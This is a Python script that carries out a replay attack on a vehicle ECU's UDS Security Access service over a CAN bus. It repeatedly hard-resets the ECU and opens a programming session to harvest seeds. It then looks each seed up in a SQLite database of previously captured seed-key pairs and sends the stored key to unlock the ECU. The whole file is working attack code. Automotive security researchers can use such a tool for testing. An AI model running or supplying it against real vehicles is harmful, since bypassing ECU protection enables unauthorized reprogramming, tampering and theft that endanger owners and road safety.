from pathlib import Path
import sys
import time
import threading
from threading import Event
import can
import sqlite3

CURRENT_DIR = Path(__file__).resolve().parent
LOG_FILE_PATH_DIAGNOSTIC = CURRENT_DIR / "logs/diagnostic.txt"
DB_PATH = CURRENT_DIR / "logs/uds_seeds.db"
sys.path.append(str(Path(CURRENT_DIR.parents[1]/"API").absolute()))
from CAN_API_Wrapper import UDSMessage

stop_tester_present = Event()# Flag to stop Tester Present

def send_tester_present(bus, txid, rxid):
    """Send TesterPresent (02 3E 80)"""
    tp_raw_data = [0x02, 0x3E, 0x80, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA]
    is_extended = txid > 0x7FF
    # Build CAN frame using python-can library
    can_msg = can.Message(
        arbitration_id=txid,
        data=tp_raw_data,
        is_extended_id=is_extended
    )
    while not stop_tester_present.is_set():
        try:
            bus.send(can_msg)
        except Exception as e:
            print(f"[!] Error sending: {e}")
        time.sleep(1.0)

def trova_key_da_seed(seed_input):
    """Search key associated to seed in DB"""
    # transform input into hex string
    if isinstance(seed_input, int):
        seed_str = f"{seed_input:08X}"
    else:
        # If it is already a string remove '0x' if present
        seed_str = seed_input.replace("0x", "").replace("0X", "").strip()

    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        # Use LIKE to ignore Upper/lowercas
        cursor.execute("""
            SELECT associated_key 
            FROM seed_key_pairs 
            WHERE seed LIKE ? AND associated_key IS NOT NULL
        """, (seed_str,))
        row = cursor.fetchone()
        if row:
            return row[0] # Return key

def security_access_unlock_replay(txid, rxid):
    """
    The function ask for SA service, receives the seed and looks for key in the DB 
    If the key is in the DB send it, otherwise ask a new seed
    """
    interface = "can0"
    MAX_SEED_ATTEMPT = 20  # avoid endless loops
    MAX_TENTATIVI = 5 # avoid endless loops
    SERVICE = 0x27 #SA
    SID_ECU_RESET = 0x11 #SID for ECU reset
    SUB_FUNCTION_RESET = 0x01 #hard reset
    session_security = 0x01 #security level
    id_hex = f"0x{rxid:X}"

    # --- REPLAY LOOP LOGIC ---
    sblocco_completato = False
    tentativi_seed_ignoti = 0
    can_filters = [
        {"can_id": txid, "can_mask": 0x1FFFFFFF, "extended": True},
        {"can_id": rxid, "can_mask": 0x1FFFFFFF, "extended": True}
    ]
    bus = can.interface.Bus(channel=interface, interface="socketcan", can_filters=can_filters)
    #messages for programming session
    payload_session = bytearray([0x10, 0x02]) #02 10 02
    #messages per SA
    payload_SA = bytearray([SERVICE, session_security])
    msg = UDSMessage(bus=bus, byte_array=payload_SA, rxid=rxid, txid=txid)    
    #HARD RESET
    payload_reset = [SID_ECU_RESET,SUB_FUNCTION_RESET]
    #THREAD for tester present
    stop_tester_present.clear()
    tp_thread = threading.Thread(target=send_tester_present, args=(bus, txid, rxid), daemon=True)
    
    msg.start()
    tp_thread.start()
    time.sleep(0.2)

    #If I didn't guess the key or there were too many attempts
    while not sblocco_completato and tentativi_seed_ignoti < MAX_SEED_ATTEMPT:
        risposta_arrivata = False
        tentativi = 0
        last_seed_int = None
        sblocco_completato = False
        session_key = session_security + 0x01
        while not risposta_arrivata and tentativi < MAX_TENTATIVI:
            msg.set_payload(payload_reset)
            msg.send() #ask for hard reset
            time.sleep(1.5)
            msg.set_payload(payload_session)
            msg.send() #ask for programming session
            time.sleep(0.15) 
            while msg.stack.available():
                msg.stack.recv()
            msg.set_payload(payload_SA)
            msg.send() #ask for security access
            tentativi += 1
            rx_data = msg.recv(timeout=1.0)# wait for Seed
            
            if rx_data is not None and len(rx_data) >= 2:
                # Positive response: [0x67, 0x01, SEED_BYTE1, ...]
                if rx_data[0] == (SERVICE + 0x40) and rx_data[1] == session_security:
                    risposta_arrivata = True
                    seed_bytes = rx_data[2:]
                    current_seed_str = "".join(f"{b:02X}" for b in seed_bytes)
                    data_hex = ' '.join(f"{b:02X}" for b in rx_data)
                    timestamp_str = f"{time.time():.4f}"
                    print(f"[ SA {SERVICE:02X} SEED ]            | {timestamp_str:<15} | {id_hex:<13} | SEED: {current_seed_str:<30} | {data_hex}")
                    last_seed_int = int.from_bytes(seed_bytes, byteorder='big')
                    break
                # Negative response or Response Pending
                elif rx_data[0] == 0x7F and len(rx_data) >= 3:
                    nrc = rx_data[2]
                    data_hex = ' '.join(f"{b:02X}" for b in rx_data)
                    timestamp_str = f"{time.time():.4f}"
                    
                    if nrc == 0x78:
                        print(f"[ SA {SERVICE:02X} PENDING ]         | {timestamp_str:<15} | {id_hex:<13} | ECU BUSY -> Response Pending (0x78) | {data_hex}")
                        #retry after response pending
                        rx_data_retry = msg.recv(timeout=3.0)
                        if rx_data_retry and len(rx_data_retry) >= 2 and rx_data_retry[0] == (SERVICE + 0x40):
                            risposta_arrivata = True
                            seed_bytes = rx_data_retry[2:]
                            print(f"[ SA {SERVICE:02X} SEED ]            | {timestamp_str:<15} | {id_hex:<13} | SEED: {''.join(f'{b:02X}' for b in seed_bytes):<30} | {' '.join(f'{b:02X}' for b in rx_data_retry)}")
                            last_seed_int = int.from_bytes(seed_bytes, byteorder='big')
                    else:
                        print(f"[ SA {SERVICE:02X} ERROR ]           | {timestamp_str:<15} | {id_hex:<13} | NEGATIVE RESPONSE -> NRC 0x{nrc:02X}  | {data_hex}")
            else:
                if tentativi < MAX_TENTATIVI:
                    print(f"[!] Timeout Seed Request-> Retry (Attempt {tentativi}/{MAX_TENTATIVI})...")
                time.sleep(0.07)
    
        if not risposta_arrivata or last_seed_int is None:
            print(f"[ERR] SA failed after {MAX_TENTATIVI} attempts")
        #I got the seed
        if risposta_arrivata and last_seed_int is not None:
            key_trovata = trova_key_da_seed(last_seed_int) #find Key
            if key_trovata is not None:
                key_bytes = bytearray.fromhex(key_trovata)
                # SID 0x27, Subfunctione 0x02 (Send Key)
                payload_key = bytearray([SERVICE, session_key]) + key_bytes
                print(f"[*] sending key...")
                msg.set_payload(payload_key)
                msg.send()
                rx_data = msg.recv(timeout=3.0) #wait
                if rx_data is not None and len(rx_data) >= 2:
                    # SUCCESS (67 02)
                    if rx_data[0] == (SERVICE + 0x40) and rx_data[1] == session_key:
                        sblocco_completato = True
                        data_hex = ' '.join(f"{b:02X}" for b in rx_data)
                        timestamp_str = f"{time.time():.4f}"
                        print(f"[ SA {SERVICE:02X} KEY OK ]          | {timestamp_str:<15} | {id_hex:<13} | Security Access unlocked!   | {data_hex}")
                    elif rx_data[0] == 0x7F and len(rx_data) >= 3:
                        nrc = rx_data[2]
                        data_hex = ' '.join(f"{b:02X}" for b in rx_data)
                        timestamp_str = f"{time.time():.4f}"
                        #INVALID KEY
                        if nrc == 0x35:
                            print(f"[ SA {SERVICE:02X} ERROR ]           | {timestamp_str:<15} | {id_hex:<13} | INVALID KEY -> Chiave Errata (0x35) | {data_hex}")
                            tentativi_seed_ignoti += 1
                        #PENDING
                        elif nrc == 0x78:
                            print(f"[ SA {SERVICE:02X} PENDING ]         | {timestamp_str:<15} | {id_hex:<13} | ECU BUSY -> Response Pending (0x78) | {data_hex}")
                            rx_data_final = msg.recv(timeout=3.0)
                            if rx_data_final and len(rx_data_final) >= 2 and rx_data_final[0] == (SERVICE + 0x40):
                                sblocco_completato = True
                                print(f"[ SA {SERVICE:02X} KEY OK ]          | {timestamp_str:<15} | {id_hex:<13} | Security Access unlocked!   | {' '.join(f'{b:02X}' for b in rx_data_final)}")
                            else:
                                tentativi_seed_ignoti += 1
                        else:
                            print(f"[ SA {SERVICE:02X} ERROR ]           | {timestamp_str:<15} | {id_hex:<13} | NEGATIVE RESPONSE -> NRC 0x{nrc:02X}  | {data_hex}")
                            tentativi_seed_ignoti += 1
            # seed unknown
            else:
                seed_hex = f"0x{last_seed_int:X}" if isinstance(last_seed_int, int) else str(last_seed_int)
                print(f"[-] Seed {seed_hex} not present in DB. Increase attempts...")
                tentativi_seed_ignoti += 1
                time.sleep(0.5)
        else:
            print("[-] No seed received (Timeout). Increase attempts...")
            tentativi_seed_ignoti += 1
    
    if not sblocco_completato:
        print(f"[ERR] Replay failed after {tentativi_seed_ignoti} seed")
    stop_tester_present.set()
    tp_thread.join(timeout=1)
    msg.stop()    
    bus.shutdown()
    print("[*] Thread Tester Present terminated.")

if __name__ == "__main__": 
    f=open(LOG_FILE_PATH_DIAGNOSTIC,"r")
    line = f.readline()
    tx=int(line.split(" ")[0], 16) 
    rx=int(line.split(" ")[1], 16) 
    print(f"tx {hex(tx)} rx {hex(rx)}")
    security_access_unlock_replay(tx, rx)
    